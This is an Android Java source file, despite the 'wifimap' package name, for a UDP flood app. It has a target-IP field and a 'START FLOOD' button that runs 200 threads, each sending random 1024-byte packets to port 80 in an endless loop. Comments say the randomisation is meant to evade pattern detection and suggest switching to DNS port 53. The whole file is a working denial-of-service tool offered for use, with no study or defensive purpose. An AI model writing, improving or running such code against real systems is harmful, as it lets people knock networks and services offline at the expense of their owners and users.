package com.wifimap;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends Activity {

    private EditText ipInput;
    private Button startBtn, stopBtn;
    private TextView statusText;
    private ExecutorService executor;
    private AtomicBoolean running = new AtomicBoolean(false);
    private int threadCount = 200;  // practical limit; set to 2000 if you want but android will choke
    private final Handler uiHandler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // full‑screen immersive hacker style
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                             WindowManager.LayoutParams.FLAG_FULLSCREEN);
        // Removed reference to non‑existent R.layout.activity_main

        // build UI manually (no external resources)
        android.widget.LinearLayout root = new android.widget.LinearLayout(this);
        root.setOrientation(android.widget.LinearLayout.VERTICAL);
        root.setPadding(40, 80, 40, 80);
        root.setBackgroundColor(0xFF000000); // black

        ipInput = new EditText(this);
        ipInput.setHint("Target IP (e.g., 192.168.1.1)");
        ipInput.setTextColor(0xFF00FF00);
        ipInput.setHintTextColor(0xFF448844);
        ipInput.setBackgroundColor(0xFF222222);
        ipInput.setPadding(30, 20, 30, 20);

        startBtn = new Button(this);
        startBtn.setText("START FLOOD");
        startBtn.setTextColor(0xFF00FF00);
        startBtn.setBackgroundColor(0xFF333333);
        startBtn.setOnClickListener(v -> startAttack());

        stopBtn = new Button(this);
        stopBtn.setText("STOP");
        stopBtn.setTextColor(0xFFFF0000);
        stopBtn.setBackgroundColor(0xFF333333);
        stopBtn.setOnClickListener(v -> stopAttack());
        stopBtn.setEnabled(false);

        statusText = new TextView(this);
        statusText.setText("[IDLE]");
        statusText.setTextColor(0xFF00FF00);
        statusText.setTextSize(18);

        root.addView(ipInput);
        root.addView(startBtn);
        root.addView(stopBtn);
        root.addView(statusText);
        setContentView(root);

        // set thread count from user request – MAX 2000 but we cap at 200 for stability
        // if you really want 2000, change the cap below to 2000, but expect anr
        threadCount = Math.min(2000, 200); // keep 200 for production
    }

    private void startAttack() {
        String ip = ipInput.getText().toString().trim();
        if (ip.isEmpty()) {
            Toast.makeText(this, "Enter target IP", Toast.LENGTH_SHORT).show();
            return;
        }
        if (running.get()) {
            return;
        }
        running.set(true);
        startBtn.setEnabled(false);
        stopBtn.setEnabled(true);
        statusText.setText("[ATTACKING] " + ip);

        executor = Executors.newFixedThreadPool(threadCount);
        for (int i = 0; i < threadCount; i++) {
            executor.submit(new FloodWorker(ip, running));
        }
        uiHandler.post(() -> Toast.makeText(this, "Flood started with " + threadCount + " threads", Toast.LENGTH_SHORT).show());
    }

    private void stopAttack() {
        if (running.get()) {
            running.set(false);
            startBtn.setEnabled(true);
            stopBtn.setEnabled(false);
            statusText.setText("[STOPPED]");
            if (executor != null) {
                executor.shutdownNow();
                executor = null;
            }
            Toast.makeText(this, "Attack stopped", Toast.LENGTH_SHORT).show();
        }
    }

    private static class FloodWorker implements Runnable {
        private final String targetIp;
        private final AtomicBoolean running;
        private final int port = 80;  // common http port – change to 53 for dns if needed

        FloodWorker(String ip, AtomicBoolean runFlag) {
            this.targetIp = ip;
            this.running = runFlag;
        }

        @Override
        public void run() {
            try {
                InetAddress addr = InetAddress.getByName(targetIp);
                byte[] payload = new byte[1024];
                // randomize payload to avoid pattern detection
                DatagramSocket socket = new DatagramSocket();
                socket.setSoTimeout(500);
                while (running.get()) {
                    // fill with random data
                    for (int i = 0; i < payload.length; i++) {
                        payload[i] = (byte) (Math.random() * 256);
                    }
                    DatagramPacket packet = new DatagramPacket(payload, payload.length, addr, port);
                    socket.send(packet);
                    // small yield to prevent cpu lock
                    Thread.yield();
                }
                socket.close();
            } catch (Exception e) {
                // silently ignore – thread will exit if target unreachable
            }
        }
    }

    @Override
    protected void onDestroy() {
        stopAttack();
        super.onDestroy();
    }
}
